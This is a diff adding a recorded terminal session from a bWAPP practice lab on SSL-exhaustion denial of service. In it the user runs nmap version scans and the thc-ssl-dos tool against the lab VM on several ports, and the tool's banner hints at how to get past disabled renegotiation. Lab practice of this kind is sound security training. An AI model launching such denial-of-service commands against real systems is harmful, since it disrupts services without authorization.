@@ -1,0 +1,299 @@
+Script started on 2020-08-18 02:15:31+05:30 [TERM="xterm-256color" TTY="/dev/pts/6" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos [1@m[1@a[1@n[1@ 
+No manual entry for thc-ssl-dos
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ man thc-ssl-dos [1P[1P[1P[1P[C[C[C[C[C[C[C[C[C[C[C[C-h
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+./thc-ssl-dos [options] <ip> <port>
+  -h      help
+  -l <n>  Limit parallel connections [default: 400]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos -h[K[K10.10.10.7 --[K[K[K 
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+ERROR:
+Please agree by using '--accept' option that the IP is a legitimate target
+and that you are fully authorized to perform the test against this target.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 --accept
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+Waiting for script kiddies to piss off................
+The force is with those who read the source...
+Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
+ERROR: Target has disabled renegotiations.
+Use your own skills to modify the source to test/attack
+the target [hint: TCP reconnect for every handshake].
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ nmap -sV[K[K[K10.10.10.7
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 02:17 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0047s latency).
+Not shown: 983 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+666/tcp  open  doom
+3306/tcp open  mysql
+5901/tcp open  vnc-1
+6001/tcp open  X11:1
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+9080/tcp open  glrpc
+
+Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ nmap 10.10.10.7 -sS[KV[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ nmap 10.10.10.7 -sV
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 02:17 IST
+Nmap scan report for 10.10.10.7
+Host is up (0.0090s latency).
+Not shown: 983 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.1
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+25/tcp   open  smtp        Postfix smtpd
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2 mod_fastcgi/2.4.6 PHP/5.2.4-2ubuntu5 with Suhosin-Patch mod_ssl/2.2.8 OpenSSL/0.9.8g)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ITSECGAMES)
+443/tcp  open  ssl/https?
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: ITSECGAMES)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login?
+514/tcp  open  shell?
+666/tcp  open  doom?
+3306/tcp open  mysql       MySQL 5.0.96-0ubuntu3
+5901/tcp open  vnc         VNC (protocol 3.8)
+6001/tcp open  X11         (access denied)
+8080/tcp open  http-proxy?
+8443/tcp open  https-alt?
+9080/tcp open  http        lighttpd 1.4.19
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port666-TCP:V=7.80%I=7%D=8/18%Time=5F3AED1A%P=x86_64-pc-linux-gnu%r(bea
+SF:st2,400,"\*\*\*\x20bWAPP\x20Movie\x20Service\x20\*\*\*\nMatching\x20mov
+SF:ies:\x200\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0")%r(GetRequest,400,"\*\*\*\x20bWAPP\x20Movie\x20Service\x
+SF:20\*\*\*\nMatching\x20movies:\x200\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
+Service Info: Host:  bee-box; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.13 seconds
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 443 --accept
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+Waiting for script kiddies to piss off................
+The force is with those who read the source...
+Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
+ERROR: Target has disabled renegotiations.
+Use your own skills to modify the source to test/attack
+the target [hint: TCP reconnect for every handshake].
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 443 --accept[1@8
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+Waiting for script kiddies to piss off................
+The force is with those who read the source...
+Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
+ERROR: Target has disabled renegotiations.
+Use your own skills to modify the source to test/attack
+the target [hint: TCP reconnect for every handshake].
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 8443 --accept[1P[C[1P[1P[1P --accept9 --accept0 --accept8 --accept0 --accept
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+Waiting for script kiddies to piss off................
+The force is with those who read the source...
+Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+Handshakes 0 [0.00 h/s], 400 Conn, 0 Err
+SSL: error:00000000:lib(0):func(0):reason(0)
+#0: This does not look like SSL!
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 9080 --accept8443[C[C[C[C[C[C[C[C[C[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 8443 --accept^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ thc-ssl-dos 10.10.10.7 9080 --accept8443[C[C[C[C[C[C[C[C[C
+     ______________ ___  _________
+     \__    ___/   |   \ \_   ___ \
+       |    | /    ~    \/    \  \/
+       |    | \    Y    /\     \____
+       |____|  \___|_  /  \______  /
+                     \/          \/
+            http://www.thc.org
+
+          Twitter @hackerschoice
+
+Greetingz: the french underground
+
+Waiting for script kiddies to piss off................
+The force is with those who read the source...
+Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
+ERROR: Target has disabled renegotiations.
+Use your own skills to modify the source to test/attack
+the target [hint: TCP reconnect for every handshake].
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ ^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Denial-of-Service-SSL-Exhaustion[01;31mdinesh@evil[00m: [[01;34mDenial-of-Service-SSL-Exhaustion[00m] $ exit
+
+Script done on 2020-08-18 02:48:25+05:30 [COMMAND_EXIT_CODE="255"]
